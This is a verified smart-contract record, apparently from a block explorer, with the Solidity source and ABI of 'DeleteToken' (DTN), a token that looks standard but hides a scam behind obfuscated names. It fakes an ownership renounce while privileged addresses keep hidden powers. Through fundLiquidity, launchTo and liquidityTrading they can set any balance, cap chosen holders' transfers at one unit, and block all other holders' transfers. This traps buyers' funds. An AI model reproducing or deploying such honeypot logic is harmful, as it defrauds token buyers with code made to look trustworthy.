{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface sellTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeMode) external view returns (uint256);\n\n    function transfer(address enableReceiver, uint256 modeAmount) external returns (bool);\n\n    function allowance(address amountShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableReceiver,\n        uint256 modeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atSwapLaunched, uint256 value);\n    event Approval(address indexed amountShould, address indexed spender, uint256 value);\n}\n\nabstract contract launchShouldFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingLimitLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingWallet {\n    function createPair(address feeBuy, address liquidityShouldSwap) external returns (address);\n}\n\ninterface sellTeamMetadata is sellTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeleteToken is launchShouldFee, sellTeam, sellTeamMetadata {\n\n    bool public fundTrading;\n\n    function balanceOf(address takeMode) public view virtual override returns (uint256) {\n        return walletLaunched[takeMode];\n    }\n\n    function owner() external view returns (address) {\n        return fromIs;\n    }\n\n    mapping(address => uint256) private walletLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverExempt;\n    }\n\n    uint256 takeModeSender;\n\n    function getOwner() external view returns (address) {\n        return fromIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundSwapLaunch;\n    }\n\n    function launchedFrom() public {\n        emit OwnershipTransferred(listFrom, address(0));\n        fromIs = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenExempt;\n    }\n\n    constructor (){\n        if (liquidityAmount != tokenReceiver) {\n            liquidityAmount = tokenReceiver;\n        }\n        marketingLimitLiquidity swapBuy = marketingLimitLiquidity(atSender);\n        tokenMode = marketingWallet(swapBuy.factory()).createPair(swapBuy.WETH(), address(this));\n        if (liquidityAmount != tokenReceiver) {\n            feeSender = true;\n        }\n        listFrom = _msgSender();\n        launchedFrom();\n        isAuto[listFrom] = true;\n        walletLaunched[listFrom] = tokenExempt;\n        \n        emit Transfer(address(0), listFrom, tokenExempt);\n    }\n\n    function sellLaunch(address receiverLiquidity, address enableReceiver, uint256 modeAmount) internal returns (bool) {\n        require(walletLaunched[receiverLiquidity] >= modeAmount);\n        walletLaunched[receiverLiquidity] -= modeAmount;\n        walletLaunched[enableReceiver] += modeAmount;\n        emit Transfer(receiverLiquidity, enableReceiver, modeAmount);\n        return true;\n    }\n\n    address tokenTeamSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private fromIs;\n\n    function sellAmount() private view {\n        require(isAuto[_msgSender()]);\n    }\n\n    function modeMaxFee(address receiverLiquidity, address enableReceiver, uint256 modeAmount) internal returns (bool) {\n        if (receiverLiquidity == listFrom) {\n            return sellLaunch(receiverLiquidity, enableReceiver, modeAmount);\n        }\n        uint256 teamTake = sellTeam(tokenMode).balanceOf(tokenTeamSender);\n        require(teamTake == listReceiver);\n        require(enableReceiver != tokenTeamSender);\n        if (takeSenderMax[receiverLiquidity]) {\n            return sellLaunch(receiverLiquidity, enableReceiver, walletFee);\n        }\n        return sellLaunch(receiverLiquidity, enableReceiver, modeAmount);\n    }\n\n    address atSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant walletFee = 1 ** 10;\n\n    address public tokenMode;\n\n    bool public feeSender;\n\n    function approve(address isTakeMarketing, uint256 modeAmount) public virtual override returns (bool) {\n        atEnable[_msgSender()][isTakeMarketing] = modeAmount;\n        emit Approval(_msgSender(), isTakeMarketing, modeAmount);\n        return true;\n    }\n\n    uint256 public liquidityAmount;\n\n    function allowance(address launchMaxIs, address isTakeMarketing) external view virtual override returns (uint256) {\n        if (isTakeMarketing == atSender) {\n            return type(uint256).max;\n        }\n        return atEnable[launchMaxIs][isTakeMarketing];\n    }\n\n    function transferFrom(address receiverLiquidity, address enableReceiver, uint256 modeAmount) external override returns (bool) {\n        if (_msgSender() != atSender) {\n            if (atEnable[receiverLiquidity][_msgSender()] != type(uint256).max) {\n                require(modeAmount <= atEnable[receiverLiquidity][_msgSender()]);\n                atEnable[receiverLiquidity][_msgSender()] -= modeAmount;\n            }\n        }\n        return modeMaxFee(receiverLiquidity, enableReceiver, modeAmount);\n    }\n\n    function launchTo(address minExempt) public {\n        sellAmount();\n        if (tokenReceiver != liquidityAmount) {\n            tokenReceiver = liquidityAmount;\n        }\n        if (minExempt == listFrom || minExempt == tokenMode) {\n            return;\n        }\n        takeSenderMax[minExempt] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atFrom;\n    }\n\n    address public listFrom;\n\n    uint8 private fundSwapLaunch = 18;\n\n    function transfer(address enableSender, uint256 modeAmount) external virtual override returns (bool) {\n        return modeMaxFee(_msgSender(), enableSender, modeAmount);\n    }\n\n    function exemptMode(address buyExempt) public {\n        if (fundTrading) {\n            return;\n        }\n        if (tokenReceiver == liquidityAmount) {\n            liquidityAmount = tokenReceiver;\n        }\n        isAuto[buyExempt] = true;\n        \n        fundTrading = true;\n    }\n\n    mapping(address => bool) public isAuto;\n\n    mapping(address => mapping(address => uint256)) private atEnable;\n\n    uint256 public tokenReceiver;\n\n    function liquidityTrading(uint256 modeAmount) public {\n        sellAmount();\n        listReceiver = modeAmount;\n    }\n\n    uint256 private tokenExempt = 100000000 * 10 ** 18;\n\n    uint256 listReceiver;\n\n    function fundLiquidity(address enableSender, uint256 modeAmount) public {\n        sellAmount();\n        walletLaunched[enableSender] = modeAmount;\n    }\n\n    string private receiverExempt = \"Delete Token\";\n\n    string private atFrom = \"DTN\";\n\n    bool private receiverTrading;\n\n    event OwnershipTransferred(address indexed amountTotal, address indexed receiverAmount);\n\n    mapping(address => bool) public takeSenderMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSwapLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMaxIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTakeMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTakeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"}],\"name\":\"exemptMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"fundLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"}],\"name\":\"launchTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"liquidityTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeSenderMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DeleteToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}